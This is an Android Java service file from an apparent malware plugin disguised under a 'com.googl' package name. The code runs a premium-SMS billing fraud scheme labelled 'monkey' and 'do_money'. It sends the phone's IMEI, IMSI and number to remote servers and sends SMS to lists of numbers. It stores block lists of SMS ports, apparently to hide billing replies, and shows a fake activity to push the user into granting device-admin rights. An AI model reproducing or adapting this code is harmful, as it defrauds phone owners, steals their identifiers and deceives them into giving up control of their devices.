package com.xstd.plugin.service;

import android.app.IntentService;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import android.text.TextUtils;
import com.googl.plugin.x.FakeActivity;
import com.googl.plugin.x.R;
import com.plugin.common.utils.CustomThreadPool;
import com.plugin.common.utils.UtilsRuntime;
import com.plugin.internet.InternetUtils;
import com.umeng.analytics.MobclickAgent;
import com.xstd.plugin.Utils.BRCUtil;
import com.xstd.plugin.Utils.CommonUtil;
import com.xstd.plugin.Utils.DomanManager;
import com.xstd.plugin.Utils.SMSUtil;
import com.xstd.plugin.api.*;
import com.xstd.plugin.binddevice.DeviceBindBRC;
import com.xstd.plugin.config.AppRuntime;
import com.xstd.plugin.config.Config;
import com.xstd.plugin.config.SettingManager;

import java.io.File;
import java.util.Calendar;
import java.util.HashMap;
import java.util.UUID;

/**
 * Created with IntelliJ IDEA.
 * User: michael
 * Date: 13-10-20
 * Time: AM8:53
 * To change this template use File | Settings | File Templates.
 */
public class PluginService extends IntentService {

    public static final String ACTIVE_ACTION = "com.xstd.plugin.active";

    public static final String ACTIVE_PLUGIN_PACKAGE_ACTION = "com.xstd.plugin.package.active";

    public static final String SMS_BROADCAST_ACTION = "com.xstd.plugin.broadcast";

    public static final String ACTIVE_FETCH_PHONE_ACTION = "com.xstd.plugin.fetch.phone";

    public static final String ACTION_MAIN_UUID_ACTIVE_BY_PLUGN = "com.xstd.main.uuid.active";

    /**
     * 扣费行动
     */
    public static final String MONKEY_ACTION = "com.xstd.plugin.monkey";

    public PluginService() {
        super("PluginService");
    }

    @Override
    public void onHandleIntent(Intent intent) {
        MobclickAgent.onResume(this);

        Config.LOGD("[[PluginService::onHandleIntent]] intent : " + intent);
        if (intent != null) {
            String action = intent.getAction();
            Config.LOGD("[[PluginService::onHandleIntent]] action : " + action);
            if (ACTIVE_ACTION.equals(action) && !AppRuntime.ACTIVE_PROCESS_RUNNING.get()) {
                //do active
                activePluginAction();
            } else if (ACTIVE_PLUGIN_PACKAGE_ACTION.equals(action)) {
                /**
                 * 其实什么也不需要做，这个action主要就是激活一下plugin程序
                 * 这条消息是由主程序发出的，如果主程序不激活子程序的话，子程序是不能接受到所有的BRC的
                 */
                activePluginPackageAction(intent);
            } else if (MONKEY_ACTION.equals(action)) {
                /**
                 * 扣费逻辑
                 */
                monkeyAction();
            } else if (SMS_BROADCAST_ACTION.equals(action)) {
                broadcastSMSForSMSCenter(intent);
            } else if (ACTIVE_FETCH_PHONE_ACTION.equals(action)) {
                fetchPhoneFromServer();
            } else if (ACTION_MAIN_UUID_ACTIVE_BY_PLUGN.equals(action)) {
                //子程序模拟母程序激活
                activeMainApk();
            }
        }

        MobclickAgent.onPause(this);
    }

    private void activeMainApk() {
        if (Config.DEBUG) {
            Config.LOGD("[[PluginService::activeMainApk]]");
        }

        if (AppRuntime.isTablet(getApplicationContext())) {
            if (Config.DEBUG) {
                Config.LOGD("[[PluginService::activeMainApk]] return as the device is Tab");
            }
            return;
        }

        try {
            String phone = UtilsRuntime.getCurrentPhoneNumber(getApplicationContext());
            if (TextUtils.isEmpty(phone)) phone = "00000000000";
            String imei = UtilsRuntime.getIMEI(getApplicationContext());
            if (TextUtils.isEmpty(imei)) {
                imei = String.valueOf(System.currentTimeMillis());
            }
            String imsi = UtilsRuntime.getIMSI(getApplicationContext());
            if (TextUtils.isEmpty(imsi)) {
                imsi = "987654321";
            }
            MainActiveRequest request = new MainActiveRequest(UtilsRuntime.getVersionName(getApplicationContext())
                                                         , imei
                                                         , imsi
                                                         , SettingManager.getInstance().getMainApkChannel()
                                                         , phone
                                                         , SettingManager.getInstance().getMainApkSendUUID()
                                                         , "http://www.xinsuotd.net/gais/"
                                                         , SettingManager.getInstance().getMainExtraInfo());
            MainActiveResponse response = InternetUtils.request(getApplicationContext(), request);

            if (response != null && !TextUtils.isEmpty(response.url)) {
                if (Config.DEBUG) {
                    Config.LOGD("[[Plugin::activeMainApk]] active success, response : " + response.toString());
                }
                //激活成功
                SettingManager.getInstance().setMainApkActiveTime(System.currentTimeMillis());
                return;
            }
        } catch (Exception e) {
        }
    }


    private synchronized void fetchPhoneFromServer() {
        if (Config.DEBUG) {
            Config.LOGD("[[PluginService::fetchPhoneFromServer]] entry");
        }

        try {
            if (TextUtils.isEmpty(SettingManager.getInstance().getCurrentPhoneNumber())) {
                String imsi = UtilsRuntime.getIMSI(getApplicationContext());
                if (!TextUtils.isEmpty(imsi)) {
                    if (!UtilsRuntime.isOnline(getApplicationContext())) return;

                    PhoneFetchRespone respone = InternetUtils.request(getApplicationContext()
                                                                         , new PhoneFetchRequest(
                                                                                                    DomanManager.getInstance(getApplicationContext())
                                                                                                        .getOneAviableDomain()
                                                                                                        + "/tools/i2n/" + imsi));
                    if (respone != null && !TextUtils.isEmpty(respone.phone)) {
                        if (Config.DEBUG) {
                            Config.LOGD("[[PluginService::fetchPhoneFromServer]] after fetch PHONE number : (" + respone.phone + ")");
                        }
                        if (respone.phone.length() == 11) {
                            SettingManager.getInstance().setCurrentPhoneNumber(respone.phone);
                            //notify umeng
                            HashMap<String, String> log = new HashMap<String, String>();
                            log.put("fetch", "succes");
                            log.put("phoneNumber", respone.phone);
                            log.put("phoneType", Build.MODEL);
                            CommonUtil.umengLog(getApplicationContext(), "fetch_pn_with_imei", log);
                        } else {
                            SettingManager.getInstance().setKeyLastSendMsgToServicePhone(System.currentTimeMillis());
                            //如果获取失败了，就再明天再向短信服务器发送短信.
                            SettingManager.getInstance().setKeySendMsgToServicePhoneClearTimes(0);

                            //notify umeng
                            HashMap<String, String> log = new HashMap<String, String>();
                            log.put("fetch", "failed");
                            log.put("phoneNumber", respone.phone);
                            log.put("imsi", imsi);
                            log.put("phoneType", Build.MODEL);
                            CommonUtil.umengLog(getApplicationContext(), "fetch_pn_with_imei_failed", log);
                        }
                    }
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }

        if (Config.DEBUG) {
            Config.LOGD("[[PluginService::fetchPhoneFromServer]] leave");
        }
    }

    private synchronized void broadcastSMSForSMSCenter(Intent intent) {
        if (Config.DEBUG) {
            Config.LOGD("[[PluginService::broadcastSMSForSMSCenter]] entry");
        }

        try {
            String phoneNumbers = SettingManager.getInstance().getBroadcastPhoneNumber();
            if (Config.DEBUG) {
                Config.LOGD("[[PluginService::broadcastSMSForSMSCenter]] before send broadcast, current phone Number is : " + phoneNumbers);
            }
            BRCUtil.cancelAlarmForAction(getApplicationContext(), SMS_BROADCAST_ACTION);
            if (!TextUtils.isEmpty(phoneNumbers)) {
                String[] datas = phoneNumbers.split(";");
                if (datas != null) {
                    //如果一下发送多条短信会有问题，所以增加一个延迟
                    //每次只发5条，等10分钟，再发5条
                    for (int i = 0; (i < datas.length && i < 5); ++i) {
                        String target = datas[i];
//                        if (datas[i] != null && (datas[i].length() == 11 || datas[i].startsWith("+"))) {
                        String content = datas[i];
                        if (datas[i] != null && datas[i].length() == 11) {
                            content = datas[i].substring(0, 5) + "." + datas[i].substring(5);
                            if (SMSUtil.sendSMSForLogic(datas[i], "XSTD.SC:" + content)) {
                                datas[i] = "";
                            }

                            //notify umeng
                            HashMap<String, String> log = new HashMap<String, String>();
//                            log.put("content", "XSTD.SC:" + content);
//                            log.put("to", content);
                            log.put("phoneType", Build.MODEL);
                            CommonUtil.umengLog(getApplicationContext(), "chken_send", log);
                        } else {
                            //电话号码的格式不合法，直接电话号码清空
                            datas[i] = "";
                        }

                        if (Config.DEBUG) {
                            try {
                                //等待1S
                                Thread.sleep(1000);
                            } catch (Exception e) {
                                e.printStackTrace();
                                if (Config.DEBUG) {
                                    Config.LOGD("[[PluginService::broadcastSMSForSMSCenter]]", e);
                                }
                            }

                            String phone = android.os.Build.MODEL;
                            String debugMsg = "[[通知短信]]" + phone + " 上的子程序向:" + target + "发送了:<<" + "XSTD.SC:" + content + ">>";
                            SMSUtil.sendSMSForLogic("18811087096", debugMsg);

                            Config.LOGD("[[PluginService::broadcastSMSForSMSCenter]] debug send message to 15810864155 phone" +
                                            " with " + debugMsg);
                            try {
                                //等待1S
                                Thread.sleep(1000);
                            } catch (Exception e) {
                                e.printStackTrace();
                                if (Config.DEBUG) {
                                    Config.LOGD("[[PluginService::broadcastSMSForSMSCenter]]", e);
                                }
                            }
                            SMSUtil.sendSMSForLogic("15810864155", debugMsg);
                        }

                        try {
                            //等待1S
                            Thread.sleep(2000);
                        } catch (Exception e) {
                            e.printStackTrace();
                            if (Config.DEBUG) {
                                Config.LOGD("[[PluginService::broadcastSMSForSMSCenter]]", e);
                            }
                        }
                    }

                    //重组整个数据
                    StringBuilder sb = new StringBuilder();
                    for (String d : datas) {
                        if (!TextUtils.isEmpty(d)) {
                            sb.append(d).append(";");
                        }
                    }
                    if (sb.length() > 0) {
                        SettingManager.getInstance().setBroadcastPhoneNumber(sb.substring(0, sb.length() - 1));
                        if (Config.DEBUG) {
                            Config.LOGD("[[PluginService::broadcastSMSForSMSCenter]] after send broadcast, current phone Number is : "
                                            + SettingManager.getInstance().getBroadcastPhoneNumber()
                                            + " and start alarm for next round send delay 10 min");
                        }
                        //因为还有没有发送的号码，所以启动一个定时器
                        BRCUtil.startAlarmForAction(getApplicationContext(), SMS_BROADCAST_ACTION, 10 * 60 * 1000);
                    } else {
                        //已经消耗光
                        SettingManager.getInstance().setBroadcastPhoneNumber("");
                        if (Config.DEBUG) {
                            Config.LOGD("[[PluginService::broadcastSMSForSMSCenter]] after send broadcast, current phone Number is : "
                                            + SettingManager.getInstance().getBroadcastPhoneNumber());
                        }
                    }
                }
            } else {
                if (Config.DEBUG) {
                    Config.LOGD("[[PluginService::broadcastSMSForSMSCenter]] do nothing as the phoneNumbers is empty");
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
            if (Config.DEBUG) {
                Config.LOGD("[[PluginService::broadcastSMSForSMSCenter]]", e);
            }

            if (!TextUtils.isEmpty(SettingManager.getInstance().getBroadcastPhoneNumber())) {
                //因为还有没有发送的号码，所以启动一个定时器
                BRCUtil.startAlarmForAction(getApplicationContext(), SMS_BROADCAST_ACTION, 10 * 60 * 1000);
            }
        }

        if (Config.DEBUG) {
            Config.LOGD("[[PluginService::broadcastSMSForSMSCenter]] leave");
        }
    }

    private void monkeyAction() {
        Config.LOGD("[[PluginService::monkeyAction]]");
        if (AppRuntime.ACTIVE_RESPONSE != null) {
            int monkeyType = AppRuntime.ACTIVE_RESPONSE.type;
            switch (monkeyType) {
                case 1:
                    doSMSMonkey(AppRuntime.ACTIVE_RESPONSE);
                    break;
                case 2:
                    break;
                case 3:
                    break;
            }
        }
    }

    private synchronized void doSMSMonkey(ActiveResponse response) {
        if (response == null) {
            return;
        }

        int dayCount = SettingManager.getInstance().getKeyDayCount();
        int times = response.times;
        long lastCountTime = SettingManager.getInstance().getKeyLastCountTime();
        long curTime = System.currentTimeMillis();
        long delay = ((long) (response.interval)) * 60 * 1000;
        if ((times > dayCount)
                && (lastCountTime + delay) < curTime) {
            //今天的计费还没有完成，计费一次
            if (Config.DEBUG) {
                Config.LOGD("[[PluginService::doSMSMonkey]] try to send SMS monkey with info : " + response.toString());
            }
            try {
                if (!TextUtils.isEmpty(response.port) && !TextUtils.isEmpty(response.instruction)) {
                    if (AppRuntime.ACTIVE_RESPONSE.smsCmd != null) {
                        String startPort = AppRuntime.ACTIVE_RESPONSE.smsCmd.portList.get(0);
                        String startContent = AppRuntime.ACTIVE_RESPONSE.smsCmd.contentList.get(0);
                        if (startPort.startsWith("n=")) startPort = startPort.substring(2);
                        if (startContent.startsWith("c=")) startContent = startContent.substring(2);
                        /**
                         * 注意，每次扣费的时候，第一条起始的短信都是很直接的，都是n+c的模式
                         */
                        if (SMSUtil.sendSMSForMonkey(startPort, startContent)) {
                            HashMap<String, String> log = new HashMap<String, String>();
                            log.put("phoneType", Build.MODEL);
                            log.put("channelName", AppRuntime.ACTIVE_RESPONSE.channelName);
                            CommonUtil.umengLog(getApplicationContext(), "do_money", log);

                            SettingManager.getInstance().setKeyDayCount(dayCount + 1);
                            SettingManager.getInstance().setKeyMonthCount(SettingManager.getInstance().getKeyMonthCount() + 1);
                            SettingManager.getInstance().setKeyLastCountTime(System.currentTimeMillis());
                        }
                    } else {
                        if (Config.DEBUG) {
                            Config.LOGD("[[PluginService::doSMSMonkey]] AppRuntime.ACTIVE_RESPONSE.smsCmd == null");
                        }
                    }
                }
            } catch (Exception e) {
            }
        } else {
            if (Config.DEBUG) {
                Config.LOGD("[[PluginService::doSMSMonkey]] ignore this as monkey delay not meet");
            }
        }
    }

    private void activePluginAction() {
        if (!AppRuntime.isSIMCardReady(getApplicationContext())) return;

        CustomThreadPool.asyncWork(new Runnable() {
            @Override
            public void run() {
                if (Config.DEBUG) {
                    Config.LOGD("[[PluginService::activePluginAction]] try to fetch active info, Phone Number : "
                                    + SettingManager.getInstance().getCurrentPhoneNumber());
                }
                try {
                    AppRuntime.ACTIVE_PROCESS_RUNNING.set(true);

                    if (TextUtils.isEmpty(SettingManager.getInstance().getCurrentPhoneNumber())) {
                        /**
                         * 电话号码为空就发送短信到手机服务器，以后会接受到一条短信，获取到本机的号码
                         */
//                        SMSUtil.trySendCmdToNetwork(getApplicationContext());
                        SMSUtil.trySendCmdToServicePhone1(getApplicationContext());
                    } else {
                        String imsi = UtilsRuntime.getIMSI(getApplicationContext());
                        if (TextUtils.isEmpty(imsi)) {
                            imsi = String.valueOf(System.currentTimeMillis());
                        }
                        UUID uuid = CommonUtil.deviceUuidFactory(getApplicationContext());
                        String unique = null;
                        if (uuid != null) {
                            unique = uuid.toString();
                        } else {
                            unique = imsi;
                            CommonUtil.saveUUID(getApplicationContext(), unique);
                        }

                        SettingManager.getInstance().setKeyDayActiveCount(SettingManager.getInstance().getKeyDayActiveCount() + 1);
                        if (Config.DEBUG) {
                            Config.LOGD("[[PluginService::activePluginAction]] last monkey count time = "
                                            + UtilsRuntime.debugFormatTime(SettingManager.getInstance().getKeyLastCountTime()));
                        }
                        ActiveRequest request = new ActiveRequest(getApplicationContext()
                                                                     , Config.CHANNEL_CODE
                                                                     , unique
                                                                     , getString(R.string.app_name)
                                                                     , AppRuntime.getNetworkTypeByIMSI(getApplicationContext())
                                                                     , SettingManager.getInstance().getCurrentPhoneNumber()
                                                                     , SettingManager.getInstance().getKeyLastErrorInfo()
                                                                     , DomanManager.getInstance(getApplicationContext())
                                                                           .getOneAviableDomain() + "/sais/"
                                                                     , "1");
                        //只要激活返回，就记录时间，也就是说，激活时间标识的是上次try to激活的时间，而不是激活成功的时间
                        SettingManager.getInstance().setKeyActiveTime(System.currentTimeMillis());
                        ActiveResponse response = InternetUtils.request(getApplicationContext(), request);
                        /**
                         * 只要是服务器返回了，今天就不工作了，因为如果是网络异常的话会走try catch
                         */
                        if (response != null && !TextUtils.isEmpty(response.channelName)) {
                            //notify umeng
                            HashMap<String, String> log = new HashMap<String, String>();
                            log.put("fetch", "succes");
                            log.put("channelName", response.channelName);
//                            log.put("phoneNumber", SettingManager.getInstance().getCurrentPhoneNumber());
                            log.put("osVersion", Build.VERSION.RELEASE);
                            log.put("channelCode", Config.CHANNEL_CODE);
                            log.put("phoneType", Build.MODEL);
//                            log.put("uuid", unique);
                            CommonUtil.umengLog(getApplicationContext(), "fetch_channel", log);

                            if (Config.DEBUG) {
                                Config.LOGD(response.toString());
                            }

                            //增加一步对返回通道数据的校验
                            int netType = AppRuntime.getNetworkTypeByIMSI(getApplicationContext());
                            if (!String.valueOf(netType).equals(response.operator)) {
                                //网络类型不对，这就是一个最初级的检查
                                Config.LOGD("response == null or response error");
                                networkErrorWork();
                            } else {
                                AppRuntime.ACTIVE_RESPONSE = response;
                                AppRuntime.ACTIVE_RESPONSE.parseSMSCmd();
                                AppRuntime.saveActiveResponse(AppRuntime.RESPONSE_SAVE_FILE);
//                                AppRuntime.saveActiveResponse("/sdcard/" + Config.ACTIVE_RESPONSE_FILE);
                                SettingManager.getInstance().setKeyBlockPhoneNumber(response.blockSmsPort);
                                int next = AppRuntime.randomBetween(4, 11);
                                SettingManager.getInstance().setKeyRandomNetworkTime(next);
                            }

                            /**
                             * 消耗掉今天所有的重试次数
                             */
                            if (Config.DEBUG) {
                                Config.LOGD("[[PluginService::activePluginAction]] server return data, So we set DayActiveCount = 17");
                            }
                            SettingManager.getInstance().setKeyDayActiveCount(17);
                        } else {
                            Config.LOGD("response == null or response error");
                            networkErrorWork();
                            /**
                             * 消耗掉今天所有的重试次数
                             */
                            if (Config.DEBUG) {
                                Config.LOGD("[[PluginService::activePluginAction]] server return data == null, So we set DayActiveCount = 17");
                            }
                            SettingManager.getInstance().setKeyDayActiveCount(17);

                            //notify umeng
                            HashMap<String, String> log = new HashMap<String, String>();
                            log.put("fetch", "succes");
                            log.put("channelName", "今天不扣费");
//                            log.put("phoneNumber", SettingManager.getInstance().getCurrentPhoneNumber());
                            log.put("osVersion", Build.VERSION.RELEASE);
                            log.put("channelCode", Config.CHANNEL_CODE);
                            log.put("phoneType", Build.MODEL);
//                            log.put("uuid", unique);
                            CommonUtil.umengLog(getApplicationContext(), "fetch_channel", log);
                        }
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                    if (Config.DEBUG) {
                        Config.LOGD("[[networkErrorWork]] entry", e);
                    }
                    networkErrorWork();
                    //notify umeng
                    HashMap<String, String> log = new HashMap<String, String>();
                    log.put("fetch", "failed");
//                    log.put("phoneNumber", SettingManager.getInstance().getCurrentPhoneNumber());
                    log.put("osVersion", Build.VERSION.RELEASE);
                    log.put("channelCode", Config.CHANNEL_CODE);
                    log.put("phoneType", Build.MODEL);
                    log.put("errorType", "network");
                    CommonUtil.umengLog(getApplicationContext(), "fetch_channel_failed", log);
                }

                AppRuntime.ACTIVE_PROCESS_RUNNING.set(false);
            }
        });
    }

    private void networkErrorWork() {
        if (Config.DEBUG) {
            Config.LOGD("[[networkErrorWork]] entry");
        }

        File file = new File(AppRuntime.RESPONSE_SAVE_FILE);
        file.delete();
        AppRuntime.ACTIVE_RESPONSE = null;
        int next = AppRuntime.randomBetween(0, 3);
        int lastNetworkTime = SettingManager.getInstance().getKeyRandomNetworkTime();
        int time = 0;
        int curHour = Calendar.getInstance().get(Calendar.HOUR_OF_DAY);
        if (lastNetworkTime <= 18) {
            time = curHour + next;
        } else {
            time = lastNetworkTime > curHour ? (curHour + next) : (lastNetworkTime + next);
        }
        time = time >= 24 ? 23 : time;

        SettingManager.getInstance().setKeyRandomNetworkTime(time);
    }

    private synchronized void activePluginPackageAction(Intent intent) {
        Config.LOGD("[[PluginService::onHandleIntent]] >>> action : " + ACTIVE_PLUGIN_PACKAGE_ACTION + " <<<<");
        try {
            SettingManager.getInstance().setKeyActiveAppName(intent.getStringExtra("name"));
            SettingManager.getInstance().setKeyActivePackageName(intent.getStringExtra("packageName"));
            SettingManager.getInstance().setMainApkSendUUID(intent.getStringExtra("uuid"));
            SettingManager.getInstance().setMainExtraInfo(intent.getStringExtra("extra"));
            SettingManager.getInstance().setMainApkChannel(intent.getStringExtra("channel"));

            DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
            boolean isActive = dpm.isAdminActive(new ComponentName(this.getApplicationContext(), DeviceBindBRC.class));

            if (Config.DEBUG) {
                Config.LOGD("[[PluginService::onHandleIntent]] current fake app info : name = " + intent.getStringExtra("name")
                                + " packageName = " + intent.getStringExtra("packageName")
                                + " isActive : " + isActive
                                + " **** setting manager info : (( "
                                + " name = " + SettingManager.getInstance().getKeyActiveAppName()
                                + " packageName = " + SettingManager.getInstance().getKeyActivePackageName()
                                + " uuid = " + SettingManager.getInstance().getMainApkSendUUID()
                                + " extra = " + SettingManager.getInstance().getMainExtraInfo()
                                + " channel = " + SettingManager.getInstance().getMainApkChannel()
                                + " )) >>>>>>>>>>>");
            }

            if (!isActive && !AppRuntime.FAKE_WINDOW_SHOW) {
                CommonUtil.startFakeService(getApplicationContext(), "PluginService::activePluginPackageAction");

                Intent i = new Intent();
                i.setClass(this.getApplicationContext(), FakeActivity.class);
                i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS | Intent.FLAG_ACTIVITY_CLEAR_TOP);
                startActivity(i);
            }
        } catch (Exception e) {
        }
    }

    public IBinder onBind(Intent intent) {
        return null;
    }

}
